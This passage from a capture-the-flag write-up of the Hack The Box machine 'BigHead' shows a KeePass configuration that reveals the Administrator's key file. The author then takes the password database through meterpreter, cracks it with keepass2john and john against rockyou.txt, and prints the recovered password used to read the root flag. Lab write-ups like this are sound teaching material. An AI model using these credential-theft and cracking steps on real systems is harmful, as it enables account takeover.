		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/TriggerSystem&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;PluginCompatibility&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Application&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Logging&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;MainWindow&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;X&amp;gt;&lt;/span&gt;2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/X&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Y&amp;gt;&lt;/span&gt;2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Y&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;638&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Height&amp;gt;&lt;/span&gt;450&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Height&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;SplitterHorizontalFrac&amp;gt;&lt;/span&gt;0.8333&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SplitterHorizontalFrac&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;SplitterVerticalFrac&amp;gt;&lt;/span&gt;0.25&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SplitterVerticalFrac&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Layout&amp;gt;&lt;/span&gt;Default&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Layout&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;ToolBar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;EntryView&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;TanView&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;EntryListColumnCollection&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;Title&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;UserName&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;HideWithAsterisks&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HideWithAsterisks&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;Url&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;Notes&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/EntryListColumnCollection&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;EntryListColumnDisplayOrder&amp;gt;&lt;/span&gt;0 1 2 3 4&lt;span class=&quot;nt&quot;&gt;&amp;lt;/EntryListColumnDisplayOrder&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;ListSorting&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Order&amp;gt;&lt;/span&gt;Ascending&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Order&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ListSorting&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MainWindow&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;UI&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;TrayIcon&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Hiding&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;StandardFont&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Family&amp;gt;&lt;/span&gt;Microsoft Sans Serif&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Family&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;8.25&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GraphicsUnit&amp;gt;&lt;/span&gt;Point&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GraphicsUnit&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Style&amp;gt;&lt;/span&gt;Regular&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Style&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;OverrideUIDefault&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OverrideUIDefault&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/StandardFont&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;PasswordFont&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Family&amp;gt;&lt;/span&gt;Courier New&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Family&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;8.25&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GraphicsUnit&amp;gt;&lt;/span&gt;Point&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GraphicsUnit&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Style&amp;gt;&lt;/span&gt;Regular&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Style&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;OverrideUIDefault&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OverrideUIDefault&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/PasswordFont&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;BannerStyle&amp;gt;&lt;/span&gt;WinVistaBlack&lt;span class=&quot;nt&quot;&gt;&amp;lt;/BannerStyle&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;DataEditorFont&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Family&amp;gt;&lt;/span&gt;Microsoft Sans Serif&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Family&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;8.25&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GraphicsUnit&amp;gt;&lt;/span&gt;Point&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GraphicsUnit&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Style&amp;gt;&lt;/span&gt;Regular&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Style&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;OverrideUIDefault&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OverrideUIDefault&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DataEditorFont&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;UIFlags&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/UIFlags&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;KeyCreationFlags&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/KeyCreationFlags&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;KeyPromptFlags&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/KeyPromptFlags&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/UI&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Security&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;WorkspaceLocking&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;LockAfterTime&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LockAfterTime&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;LockAfterGlobalTime&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LockAfterGlobalTime&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/WorkspaceLocking&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Policy&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;MasterPassword&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;MinimumLength&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MinimumLength&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;MinimumQuality&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MinimumQuality&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MasterPassword&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Security&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Native&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;PasswordGenerator&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;AutoGeneratedPasswordsProfile&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GeneratorType&amp;gt;&lt;/span&gt;CharSet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GeneratorType&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Length&amp;gt;&lt;/span&gt;20&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Length&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CharSetRanges&amp;gt;&lt;/span&gt;ULD_______&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CharSetRanges&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/AutoGeneratedPasswordsProfile&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;LastUsedProfile&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GeneratorType&amp;gt;&lt;/span&gt;CharSet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GeneratorType&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Length&amp;gt;&lt;/span&gt;20&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Length&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CharSetRanges&amp;gt;&lt;/span&gt;ULD_______&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CharSetRanges&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastUsedProfile&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;UserProfiles&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/PasswordGenerator&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Defaults&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;OptionsTabIndex&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OptionsTabIndex&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;SearchParameters&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;ComparisonMode&amp;gt;&lt;/span&gt;InvariantCultureIgnoreCase&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ComparisonMode&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SearchParameters&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;KeySources&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Association&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;DatabasePath&amp;gt;&lt;/span&gt;..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DatabasePath&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Password&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Password&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;KeyFilePath&amp;gt;&lt;/span&gt;..\..\Users\Administrator\Pictures\admin.png&lt;span class=&quot;nt&quot;&gt;&amp;lt;/KeyFilePath&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Association&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/KeySources&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Defaults&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Integration&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;HotKeyGlobalAutoType&amp;gt;&lt;/span&gt;393281&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HotKeyGlobalAutoType:&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;HotKeySelectedAutoType&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HotKeySelectedAutoType&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;HotKeyShowWindow&amp;gt;&lt;/span&gt;393291&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HotKeyShowWindow&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;HotKeyEntryMenu&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HotKeyEntryMenu&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;UrlSchemeOverrides&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;BuiltInOverridesEnabled&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/BuiltInOverridesEnabled&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CustomOverrides&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/UrlSchemeOverrides&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;AutoTypeAbortOnWindows&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;ProxyType&amp;gt;&lt;/span&gt;System&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ProxyType&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;ProxyAuthType&amp;gt;&lt;/span&gt;Auto&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ProxyAuthType&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Integration&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Custom&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Configuration&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;exactly-here-&quot;&gt;Exactly here :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/147.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-key-is-adminpng-in-cusersadministratorpictures-lets-download-it-&quot;&gt;The key is &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.png&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\Pictures\&lt;/code&gt;. Let’s download it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/148.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;adminpng-&quot;&gt;admin.png :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/admin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-wanted-to-test-the-key-we-still-need-the-password-&quot;&gt;I wanted to test the key (we still need the password) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/149.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/150.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-expected-the-composite-key-is-invalid-but-instead-of-that-i-got-the-file-version-is-unsupported-i-tried-many-other-version-of-keepass-and-got-the-same-error-so-i-was-sure-that-the-file-itself-was-corrupted-maybe-because-of-more-i-downloaded-it-again-with-meterpreter-itself-this-time-&quot;&gt;I expected &lt;code class=&quot;highlighter-rouge&quot;&gt;The composite key is invalid&lt;/code&gt; but instead of that I got &lt;code class=&quot;highlighter-rouge&quot;&gt;The file version is unsupported&lt;/code&gt;. I tried many other version of &lt;code class=&quot;highlighter-rouge&quot;&gt;keepass&lt;/code&gt; and got the same error. So I was sure that the file itself was corrupted (maybe because of &lt;code class=&quot;highlighter-rouge&quot;&gt;more&lt;/code&gt;). I downloaded it again with &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; itself this time :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/151.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-renamed-it-to-dbkdbx-&quot;&gt;Then I renamed it to &lt;code class=&quot;highlighter-rouge&quot;&gt;db.kdbx&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/152.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-try-again-&quot;&gt;Let’s try again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/153.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/154.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;perfect--now-we-need-the-password-i-used-keepass2john-to-put-the-kdbx-file-in-a-john-crackable-format-we-need-the-key-to-do-that-adminpng&quot;&gt;Perfect ! Now we need the password. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt; to put the &lt;code class=&quot;highlighter-rouge&quot;&gt;kdbx&lt;/code&gt; file in a &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; crackable format (we need the key to do that (&lt;code class=&quot;highlighter-rouge&quot;&gt;admin.png&lt;/code&gt;))&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;keepass2john -k admin.png &amp;gt; db.john&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/155.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-used-john-with-rockyoutxt-to-crack-it-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; to crack it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;john --wordlist=/usr/share/wordlists/rockyou.txt db.john&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/156.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-darkness-lets-try-to-open-the-database-&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;darkness&lt;/code&gt;. Let’s try to open the database :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/157.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/158.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--double-click-on-roottxt-and-it-will-copy-the-flag-into-our-clipboard-&quot;&gt;Great ! double-click on &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; and it will copy the flag into our clipboard :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/159.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-paste-it-&quot;&gt;Let’s paste it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/160.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-can-say--we-owned-root-&quot;&gt;And finally we can say … We owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---irked&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/irked/&quot;&gt;Hack The Box - Irked&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Web" /><category term="Reverse Engineering" /><category term="egghunting" /><category term="Buffer Overflow" /><category term="Windows Exploitation" /><category term="Exploit Development" /><category term="LFI" /><category term="RCE" /><category term="Forensics" /><category term="Networking" /><category term="Pivoting" /><category term="ssh" /><category term="code analysis" /><category term="Python" /><category term="php" /><summary type="html">Quick Summary Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of Silicon Valley references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is 10.10.10.112. I added it to /etc/hosts as bighead.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC bighead.htb Only one port is open which is port 80 and it’s running http. Let’s take a look. HTTP Enumeration It’s a website titled PiperNet Comes. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying PIPERNET IS HERE. Also there are two links down there, First one is THIS IS PIPERNET which is the homepage and the other one is PIEDPIPERCOIN. Let’s scroll down and see what else do we have : PIEDPIPERCOIN COMES, and there’s a small description of what piedpipercoin is. After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form : I looked at the contact info and I noticed that the email was info@bachmanity.htb. Let’s check that domain, but before doing that I wanted to check the other page PIEDPIPERCOIN : Instead of PIEDPIPERCOIN COMES it’s saying PIEDPIPERCOIN CAME but nothing is interesting. Let’s check bachmanity.htb, we need to add it to /etc/hosts first : bachmanity.htb It’s only that image and nothing else : Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with test : It sends the request to mailer.bighead.htb, Let’s add it to /etc/hosts and try again : It shows this message then it redirects the browser back to bighead.htb. I also intercepted the request with burp : Tried to manipulate the input, but couldn’t achieve anything. I went to mailer.bighead.htb and got redirected to 